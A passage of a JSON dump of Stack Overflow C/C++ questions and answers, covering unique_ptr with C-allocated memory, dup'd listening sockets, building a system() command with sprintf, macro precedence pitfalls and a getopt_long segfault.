"https://stackoverflow.com/questions/44679361/solution-for-wrapping-a-pointer-in-a-stdunique-ptr", "closed_reason": "Duplicate", "title": "solution for wrapping a pointer in a std::unique_ptr?", "body": "<p>I need to have <code>int**</code> to pass to API function call written in C. Based on the description of the API, it uses <code>malloc</code> to allocate memory, and it requires the user to free the memory after it is returned.</p>\n\n<p>How to create a <code>std::unique_ptr&lt;int*&gt;</code> ? If I have one, does <code>.get()</code> function return a <code>int**</code>. I was thinking if I could wrap my pointer in a <code>unique_ptr</code> and make sure it will be freed when out of scope. I am not sure if the following implementation ensures that memory is freed after allocation? Is there a better way of achieving this?</p>\n\n<pre><code>int ** get_double_ptr()\n{\n    int ** ids;\n    return ids;\n}\n\nint main(int argc, char **argv)\n{\n\n    std::unique_ptr&lt;int*&gt; i_ptr(get_double_ptr());\n\n    int ** idx = i_ptr.get();\n    // allocate ids using malloc ....\n\n}\n</code></pre>\n\n<p>The C function is declared as below:</p>\n\n<pre><code>int MeshToNodal(int *ne, int *nn, int *eptr, int *eind, int *numflag,\nint **xadj, int **adjncy)\n</code></pre>\n"}, {"tags": ["c", "multithreading", "sockets", "posix"], "comments": [{"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1498060711, "post_id": 44679331, "comment_id": 76346289, "body": "Couldn&#39;t find a mention of this practice in a quick search. Looks rather pointless to me. <code>dup</code> only creates a new integer handle and duplicates a couple of relatively insignificant bit flags (or just one), the <i>open file description</i> which is the bulk of file/socket data remains shared."}, {"owner": {"reputation": 1709, "user_id": 248701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bfff6ea027f826279fe563d40d53d618?s=128&d=identicon&r=PG", "display_name": "thodg", "link": "https://stackoverflow.com/users/248701/thodg"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1498071974, "post_id": 44679331, "comment_id": 76352775, "body": "I guess it might be related to close(2) race condition ?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1498116674, "post_id": 44679331, "comment_id": 76368936, "body": "Well normally a server doesn&#39;t close a listening socket, but if it needs to for some reason, then maybe duping it could be reasonable."}], "answers": [{"comments": [{"owner": {"reputation": 1709, "user_id": 248701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bfff6ea027f826279fe563d40d53d618?s=128&d=identicon&r=PG", "display_name": "thodg", "link": "https://stackoverflow.com/users/248701/thodg"}, "edited": false, "score": 0, "creation_date": 1498072075, "post_id": 44680688, "comment_id": 76352837, "body": "Insightful, but still why dup(2) ?"}, {"owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "reply_to_user": {"reputation": 1709, "user_id": 248701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bfff6ea027f826279fe563d40d53d618?s=128&d=identicon&r=PG", "display_name": "thodg", "link": "https://stackoverflow.com/users/248701/thodg"}, "edited": false, "score": 1, "creation_date": 1498077926, "post_id": 44680688, "comment_id": 76355976, "body": "Maybe because in case of thread termination, who can decide to close? If each thread has its own descriptor, code is much simpler? Using <code>dup</code> is certainly not mandatory."}], "tags": [], "owner": {"reputation": 30540, "user_id": 719263, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7feab598abfc27783641fe2b796a0155?s=128&d=identicon&r=PG", "display_name": "Jean-Baptiste Yun&#232;s", "link": "https://stackoverflow.com/users/719263/jean-baptiste-yun%c3%a8s"}, "is_accepted": false, "score": 3, "last_activity_date": 1498059782, "creation_date": 1498059782, "answer_id": 44680688, "question_id": 44679331, "link": "https://stackoverflow.com/questions/44679331/why-dup2-listening-sockets-in-multiple-threaded-servers/44680688#44680688", "title": "Why dup(2) listening sockets in multiple threaded servers?", "body": "<p>Yes kernel ensure that only one process/thread will be served in concurrent calls to <code>accept</code>. If you want do use it correctly, then you need to do it after <code>bind</code> and <code>listen</code>. After <code>bind</code> because you want to share a bound server socket... After <code>listen</code> to correctly configure the backlog for everybody.</p>\n\n<p>Now it is a matter of design: you may prefer to have a single accepting thread dispatching the work among a pool of other threads (then you need to manage a pool by yourself), or have concurrent accepting threads and put the burden on the system. The first is more complex to set up but let you have a finer control on balancing. The second is much more straightforward but doesn't give you any control on the balancing.</p>\n"}], "owner": {"reputation": 1709, "user_id": 248701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bfff6ea027f826279fe563d40d53d618?s=128&d=identicon&r=PG", "display_name": "thodg", "link": "https://stackoverflow.com/users/248701/thodg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 469, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1498059977, "creation_date": 1498056239, "last_edit_date": 1498059977, "question_id": 44679331, "link": "https://stackoverflow.com/questions/44679331/why-dup2-listening-sockets-in-multiple-threaded-servers", "title": "Why dup(2) listening sockets in multiple threaded servers?", "body": "<p>I know programmers are often not so easy with threads and parallel programming, so this is a question for experts on the matter in priority.</p>\n\n<p>There seems to be a relatively accepted but unknown good practice of calling dup(2) on listening sockets for threaded server applications. I understand the general principle of \"share nothing\" threads for peace of mind avoiding race conditions.</p>\n\n<p>My question is : if the kernel already does mutual exclusion on accept(2) return values, exactly why is it interesting at all to dup(2) the listening socket ?</p>\n\n<p>In case it is really an improvement, when should the socket be dup(2)-ed : after bind(2) or after listen(2) ?</p>\n"}, {"tags": ["c", "linux"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1498056019, "post_id": 44679195, "comment_id": 76342585, "body": "Build a <b>string</b> with <code>sprintf</code> and then pass that to <code>system</code>."}, {"owner": {"reputation": 17586, "user_id": 3482140, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/lSFth.jpg?s=128&g=1", "display_name": "Am_I_Helpful", "link": "https://stackoverflow.com/users/3482140/am-i-helpful"}, "edited": false, "score": 3, "creation_date": 1498056073, "post_id": 44679195, "comment_id": 76342635, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/5172107/c-string-and-int-concatenation\">c string and int concatenation</a>"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 8194844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c3f53d2097a3a9e94ba78603c16283e?s=128&d=identicon&r=PG&f=1", "display_name": "Nate", "link": "https://stackoverflow.com/users/8194844/nate"}, "edited": false, "score": 0, "creation_date": 1498062244, "post_id": 44679340, "comment_id": 76347219, "body": "Thanks! This worked perfectly! I didn&#39;t realize sprintf() could be used like that."}], "tags": [], "owner": {"reputation": 732, "user_id": 3779533, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb7ceb7c47ce798288bf7e7baaa7129c?s=128&d=identicon&r=PG&f=1", "display_name": "Ivan Sheigets", "link": "https://stackoverflow.com/users/3779533/ivan-sheigets"}, "is_accepted": false, "score": 2, "last_activity_date": 1498056253, "creation_date": 1498056253, "answer_id": 44679340, "question_id": 44679195, "link": "https://stackoverflow.com/questions/44679195/how-to-send-command-to-linux-command-from-c-program/44679340#44679340", "title": "How to send command to Linux command from C program", "body": "<pre><code>char fileName[80];\n\nsprintf(fileName, \"raspistill -o image%d.jpg\",n);\nsystem(filename);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 109, "user_id": 2102777, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d7ab1a4d916de54f8e1e5bfb000c8e1?s=128&d=identicon&r=PG&f=1", "display_name": "leosf6308", "link": "https://stackoverflow.com/users/2102777/leosf6308"}, "is_accepted": false, "score": 0, "last_activity_date": 1498056913, "last_edit_date": 1498056913, "creation_date": 1498056294, "answer_id": 44679350, "question_id": 44679195, "link": "https://stackoverflow.com/questions/44679195/how-to-send-command-to-linux-command-from-c-program/44679350#44679350", "title": "How to send command to Linux command from C program", "body": "<p>First, a String is a char array, so declare (I think you know, just to emphasize):</p>\n\n<pre><code>char command[32]; \n</code></pre>\n\n<p>So, simple solution will be:</p>\n\n<pre><code>sprintf(command, \"raspistill -o image%d.jpg\", n);\n</code></pre>\n\n<p>Then call <code>system(command);</code>. This is just what you need.</p>\n\n<hr>\n\n<p>EDIT:</p>\n\n<p><strong>If</strong> you <strong>need program output</strong>, try <code>popen</code>:</p>\n\n<pre><code>char command[32]; \nchar data[1024];\nsprintf(command, \"raspistill -o image%d.jpg\", n);\n//Open the process with given 'command' for reading\nFILE* file = popen(command, \"r\");\n// do something with program output.\nwhile (fgets(data, sizeof(data)-1, file) != NULL) {\n    printf(\"%s\", data);\n}\npclose(file);\n</code></pre>\n\n<p>Sources: <a href=\"https://stackoverflow.com/questions/646241/c-run-a-system-command-and-get-output\">C: Run a System Command and Get Output?</a></p>\n\n<p><a href=\"http://man7.org/linux/man-pages/man3/popen.3.html\" rel=\"nofollow noreferrer\">http://man7.org/linux/man-pages/man3/popen.3.html</a></p>\n"}], "owner": {"reputation": 17, "user_id": 8194844, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3c3f53d2097a3a9e94ba78603c16283e?s=128&d=identicon&r=PG&f=1", "display_name": "Nate", "link": "https://stackoverflow.com/users/8194844/nate"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1799, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1498073945, "creation_date": 1498055943, "last_edit_date": 1498073945, "question_id": 44679195, "link": "https://stackoverflow.com/questions/44679195/how-to-send-command-to-linux-command-from-c-program", "title": "How to send command to Linux command from C program", "body": "<p>I am trying to send a command to a Linux command line from a C program and there is one part I am not sure how to do. </p>\n\n<p>For example in my C code I have</p>\n\n<pre><code>system(\"raspistill -o image.jpg\");\n</code></pre>\n\n<p>What I would like to be able to do is add a number to the end of \"image\" and increment it every time the program runs, but how can I pass in a variable <code>n</code> to the <code>system()</code> function that is only looking for a <code>const char</code>?</p>\n\n<p>I tried this but it did not work:</p>\n\n<pre><code>char fileName = (\"raspistill -o image%d.jpg\",n);\nsystem(filename);\n</code></pre>\n\n<p>I've tried searching on this and haven't found anything about how to add a variable to it. Sorry for the noob question. </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1498055833, "post_id": 44679099, "comment_id": 76342425, "body": "Learn about operator precedence."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 1, "creation_date": 1498055855, "post_id": 44679099, "comment_id": 76342440, "body": "Expand the macro by hand and look at a table of operator precedence and you will soon see the problem."}, {"owner": {"reputation": 1582, "user_id": 3185943, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/TJBWJ.png?s=128&g=1", "display_name": "blackghost", "link": "https://stackoverflow.com/users/3185943/blackghost"}, "edited": false, "score": 0, "creation_date": 1498055952, "post_id": 44679099, "comment_id": 76342520, "body": "Also see <a href=\"https://stackoverflow.com/questions/3437404/min-and-max-in-c\">stackoverflow.com/questions/3437404/min-and-max-in-c</a> for the proper way of implementing a MAX macro."}], "answers": [{"tags": [], "owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "is_accepted": true, "score": 0, "last_activity_date": 1498055890, "creation_date": 1498055890, "answer_id": 44679172, "question_id": 44679099, "link": "https://stackoverflow.com/questions/44679099/c-programming-define-function/44679172#44679172", "title": "C Programming - #define function", "body": "<p>This is what happens in your case:</p>\n\n<pre><code>int main() {\n    int m,n;\n    m=3+2&gt;3 ? 2:3; //(3+2)&gt;3 ? 2 : 3 = 2\n    n=2*3&gt;2 ? 3:2; //(2*3)&gt;2 ? 3 : 2 = 3\n    printf(\"m=%d, n=%d\\n\",m,n);\n    return 0;\n}\n</code></pre>\n\n<p>If you rewrite your defined to <code>#define MAX(a,b) ((a)&gt;(b) ? (a):(b))</code></p>\n\n<p>then you will have desired output as it will be evaluated to:</p>\n\n<pre><code>//Correct way with parenthesis\nint main() {\n    int m,n;\n    m=3+((2)&gt;(3) ? (2):(3)); //6\n    n=2*((3)&gt;(2) ? (3):(2)); //6\n    printf(\"m=%d, n=%d\\n\",m,n);\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 3, "last_activity_date": 1498055905, "creation_date": 1498055905, "answer_id": 44679178, "question_id": 44679099, "link": "https://stackoverflow.com/questions/44679099/c-programming-define-function/44679178#44679178", "title": "C Programming - #define function", "body": "<p>This is why parenthesis in macro definitions are important.</p>\n\n<p>A macro does simple text substitution.  So when you do this:</p>\n\n<pre><code>m=3+MAX(2,3);\n</code></pre>\n\n<p>It expands to this:</p>\n\n<pre><code>m=3+2&gt;3 ? 2:3\n</code></pre>\n\n<p>With the implicit parenthesis:</p>\n\n<pre><code>m = ((3+2)&gt;3) ? 2:3\n</code></pre>\n\n<p>Which is probably not what you want.</p>\n\n<p>You need to put parenthesis around the entire macro as well as around each argument wherever it is used:</p>\n\n<pre><code>#define MAX(a,b) ((a)&gt;(b) ? (a) : (b))\n</code></pre>\n\n<p>This will then expand to:</p>\n\n<pre><code>m = 3 + ((2)&gt;(3) ? (2):(3))\n</code></pre>\n\n<p>Also note that with a macro like this you open yourself up to side effects of one of the operands.  For example, if you did this:</p>\n\n<pre><code>int a=2, b=3;\nm = MAX(a++,b);\n</code></pre>\n\n<p>You would get:</p>\n\n<pre><code>int a=2, b=3;\nm = ((a++) &gt; (b) ? (a++) : (b));\n</code></pre>\n\n<p>This invokes undefined behavior because it attempts to modify <code>a</code> more than once in an expression without a sequence point.</p>\n"}], "owner": {"reputation": 21, "user_id": 7399390, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-Pfiqq-iLW4Y/AAAAAAAAAAI/AAAAAAAAABo/WozFCnh0sMA/photo.jpg?sz=128", "display_name": "Roshan Nimje", "link": "https://stackoverflow.com/users/7399390/roshan-nimje"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 219, "favorite_count": 0, "closed_date": 1498055937, "accepted_answer_id": 44679172, "answer_count": 2, "score": -4, "last_activity_date": 1498056091, "creation_date": 1498055713, "question_id": 44679099, "link": "https://stackoverflow.com/questions/44679099/c-programming-define-function", "closed_reason": "Duplicate", "title": "C Programming - #define function", "body": "<p>I am learning C in depth. But I am not getting this program. Somebody, please tell me how the output of the below program is <strong>m=2, n=3</strong></p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define MAX(a,b) a&gt;b ? a:b\nint main()\n{\n    int m,n;\n    m=3+MAX(2,3);\n    n=2*MAX(3,2);\n    printf(\"m=%d, n=%d\\n\",m,n);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "segmentation-fault", "getopt", "getopt-long"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1498051512, "post_id": 44677433, "comment_id": 76338996, "body": "Please try to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable Example</a> and show us. And also please read <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs</a>"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1498051622, "post_id": 44677433, "comment_id": 76339094, "body": "How is <code>help_opt</code> defined and populated?"}, {"owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "edited": false, "score": 0, "creation_date": 1498051689, "post_id": 44677433, "comment_id": 76339148, "body": "help_opt-&gt;name = &quot;help&quot;; help_opt-&gt;has_arg = 0; help_opt-&gt;flag = NULL; help_opt-&gt;val = &#39;h&#39;;"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1498051828, "post_id": 44677433, "comment_id": 76339263, "body": "@Xjames56X Please edit your question to include the actual code instead. Including variable declaration, definition and initialization. Preferably in the form of an <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a> (as I asked for in my previous comment). Your comment indicates that you&#39;re doing something very bad leading to <i>undefined behavior,</i> but without seeing a <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a> it&#39;s impossible to say something for certain."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1498052575, "post_id": 44677433, "comment_id": 76339889, "body": "&quot;I don&#39;t wan&#39;t to paste everything because my school can find this code and blame me for cheating&quot; - Sounds like one of the better schools. Why don&#39;t you use the debugger?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1498053805, "post_id": 44677433, "comment_id": 76340760, "body": "Read <a href=\"http://man7.org/linux/man-pages/man3/getopt_long.3.html\" rel=\"nofollow noreferrer\">the <code>getopt_long</code> manual page</a>. Read <a href=\"http://man7.org/linux/man-pages/man3/getopt_long.3.html#EXAMPLE\" rel=\"nofollow noreferrer\">its example</a>."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1498064625, "post_id": 44677433, "comment_id": 76348496, "body": "Please <a href=\"https://stackoverflow.com/posts/44677433/edit\">edit</a> your code to reduce it to a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> of your problem.  Your current code includes much that is peripheral to your problem - a minimal sample normally looks similar to a good unit test: only performing one task, with input values specified for reproducibility."}], "answers": [{"comments": [{"owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "edited": false, "score": 0, "creation_date": 1498052721, "post_id": 44677892, "comment_id": 76339992, "body": "Yep, sorry, just reading the right doc and I doesn&#39;t have understood this line &quot;The last element of the array has to be filled with zeros.&quot;"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1498052725, "last_edit_date": 1498052725, "creation_date": 1498052564, "answer_id": 44677892, "question_id": 44677433, "link": "https://stackoverflow.com/questions/44677433/segfault-with-getopt-long/44677892#44677892", "title": "segfault with getopt_long()", "body": "<p>The third argument to <code>getopt_long</code> should not be the address of a single <code>struct option</code>, but a pointer to the first element of an array of <code>struct option</code>, the last of which should be filled with zeros.</p>\n\n<p>Because you don't pass in an array, <code>getopt_long</code> attempts to read past <code>help_opt</code> as if it were an array.  This invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>Change <code>help_opt</code> to an array with the last element zeroed out.</p>\n\n<pre><code>struct option help_opt[] = {\n    { \"help\", 0, NULL, 'h' },\n    { NULL, 0, NULL, 0 }\n};\n\n...\n\nwhile ((get_opt_err = getopt_long(argc, argv, \"p:x:y:n:c:f:h\",\n                help_opt, NULL)) != -1)\n</code></pre>\n"}], "owner": {"reputation": 849, "user_id": 3895131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/22f08f679eb1a0209d4bdc53b6ff5636?s=128&d=identicon&r=PG&f=1", "display_name": "Oscar", "link": "https://stackoverflow.com/users/3895131/oscar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1530, "favorite_count": 0, "accepted_answer_id": 44677892, "answer_count": 1, "score": 1, "last_activity_date": 1498053833, "creation_date": 1498051391, "last_edit_date": 1498053833, "question_id": 44677433, "link": "https://stackoverflow.com/questions/44677433/segfault-with-getopt-long", "title": "segfault with getopt_long()", "body": "<p>for a school project I have to use getopt_long() or getopt_long_only(). Here is my loop:</p>\n\n<pre><code>while ((get_opt_err = getopt_long(argc, argv, \"p:x:y:n:c:f:h\",\n                    &amp;help_opt, NULL)) != -1)\n</code></pre>\n\n<p>I have a segfault reported in valgrind like that:</p>\n\n<pre><code>==2971== Memcheck, a memory error detector\n==2971== Copyright (C) 2002-2015, and GNU GPL'd, by Julian Seward et al.\n==2971== Using Valgrind-3.12.0 and LibVEX; rerun with -h for copyright info\n==2971== Command: ./zappy_server --h\n==2971== \n==2971== Conditional jump or move depends on uninitialised value(s)\n==2971==    at 0x4F0B23E: _getopt_internal_r (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C240: _getopt_internal (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C2BD: getopt_long (in /usr/lib/libc-2.25.so)\n==2971==    by 0x400C3D: getopt_server_parsing (getopt_server_parsing.c:42)\n==2971==    by 0x4008AC: main (main.c:46)\n==2971== \n==2971== Use of uninitialised value of size 8\n==2971==    at 0x4C2E8C9: __GI_strncmp (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==2971==    by 0x4F0B252: _getopt_internal_r (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C240: _getopt_internal (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C2BD: getopt_long (in /usr/lib/libc-2.25.so)\n==2971==    by 0x400C3D: getopt_server_parsing (getopt_server_parsing.c:42)\n==2971==    by 0x4008AC: main (main.c:46)\n==2971== \n==2971== Invalid read of size 1\n==2971==    at 0x4C2E8C9: __GI_strncmp (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==2971==    by 0x4F0B252: _getopt_internal_r (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C240: _getopt_internal (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C2BD: getopt_long (in /usr/lib/libc-2.25.so)\n==2971==    by 0x400C3D: getopt_server_parsing (getopt_server_parsing.c:42)\n==2971==    by 0x4008AC: main (main.c:46)\n==2971==  Address 0x1170 is not stack'd, malloc'd or (recently) free'd\n==2971== \n==2971== \n==2971== Process terminating with default action of signal 11 (SIGSEGV): dumping core\n==2971==  Access not within mapped region at address 0x1170\n==2971==    at 0x4C2E8C9: __GI_strncmp (in /usr/lib/valgrind/vgpreload_memcheck-amd64-linux.so)\n==2971==    by 0x4F0B252: _getopt_internal_r (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C240: _getopt_internal (in /usr/lib/libc-2.25.so)\n==2971==    by 0x4F0C2BD: getopt_long (in /usr/lib/libc-2.25.so)\n==2971==    by 0x400C3D: getopt_server_parsing (getopt_server_parsing.c:42)\n==2971==    by 0x4008AC: main (main.c:46)\n==2971==  If you believe this happened as a result of a stack\n==2971==  overflow in your program's main thread (unlikely but\n==2971==  possible), you can try to increase the size of the\n==2971==  main thread stack using the --main-stacksize= flag.\n==2971==  The main thread stack size used in this run was 8388608.\n==2971== \n==2971== HEAP SUMMARY:\n==2971==     in use at exit: 29 bytes in 2 blocks\n==2971==   total heap usage: 2 allocs, 0 frees, 29 bytes allocated\n==2971== \n==2971== LEAK SUMMARY:\n==2971==    definitely lost: 0 bytes in 0 blocks\n==2971==    indirectly lost: 0 bytes in 0 blocks\n==2971==      possibly lost: 0 bytes in 0 blocks\n==2971==    still reachable: 29 bytes in 2 blocks\n==2971==         suppressed: 0 bytes in 0 blocks\n==2971== Rerun with --leak-check=full to see details of leaked memory\n==2971== \n==2971== For counts of detected and suppressed errors, rerun with: -v\n==2971== Use --track-origins=yes to see where uninitialised values come from\n==2971== ERROR SUMMARY: 3 errors from 3 contexts (suppressed: 0 from 0)\n[1]    2971 segmentation fault (core dumped)  valgrind ./zappy_server --h\n</code></pre>\n\n<p>Have you an idea of what happening ? It's my first use of the getopt api, and I am totally lost. It seems happening from the fact that my opt is prefixed with -- but I don't know why...</p>\n\n<p>here is my full code:</p>\n\n<pre><code>static void fill_help_opt(struct option *help_opt)\n{\n  help_opt-&gt;name = \"help\";\n  help_opt-&gt;has_arg = 0;\n  help_opt-&gt;flag = NULL;\n  help_opt-&gt;val = 'h';\n}\n\nint         getopt_server_parsing(int argc, char **argv,\n                          t_server_params *params)\n{\n    int         get_opt_err;\n    t_opts_checkers opts_fcts[7];\n    int         idx;\n    struct option       help_opt;\n\n    fill_opts_fcts(opts_fcts);\n    fill_help_opt(&amp;help_opt);\n    get_opt_err = 0;\n    while ((get_opt_err = getopt_long(argc, argv, \"p:x:y:n:c:f:h\",\n                    &amp;help_opt, NULL)) != -1)\n    {\n        idx = 0;\n        while (idx &lt; 7)\n        {\n            if (opts_fcts[idx].key == get_opt_err\n                    &amp;&amp; opts_fcts[idx].value(optarg, params, argv) != 0)\n                return (1);\n            ++idx;\n        }\n        if (get_opt_err == '?')\n            return (1);\n    }\n    return (0);\n}\n</code></pre>\n\n<p>I don't wan't to paste everything because my school can find this code and blame me for cheating... (because of copying/pasting code, even though it's mine).</p>\n"}, {"tags": ["c", "pointers", "structure", "gsl"], "comments": [{"owner": {"reputation": 3270, "user_id": 3059385, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/dc876278926d67b3da29594601fdc82a?s=128&d=identicon&r=PG&f=1", "display_name": "Christopher Schneider", "link": "https://stackoverflow.com/users/3059385/christopher-schneider"}, "edited": false, "score": 0, "creation_date": 1498050252, "post_id": 44676920, "comment_id": 76337930, "body": "You didn&#39;t post the warning or what line it&#39;s on."}, {"owner": {"reputation": 4827, "user_id": 8051589, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8VNG6.png?s=128&g=1", "display_name": "Andre Kampling", "link": "https://stackoverflow.com/users/8051589/andre-kampling"}, "edited": false, "score": 1, "creation_date": 1498050356, "post_id": 44676920, "comment_id": 76338053, "body": "What are the <code>gsl_function</code> and <code>H1</code> types, please give us the definitions."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1498050486, "post_id": 44676920, "comment_id": 76338167, "body": "Why do you cast a void* pointer to void*?"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 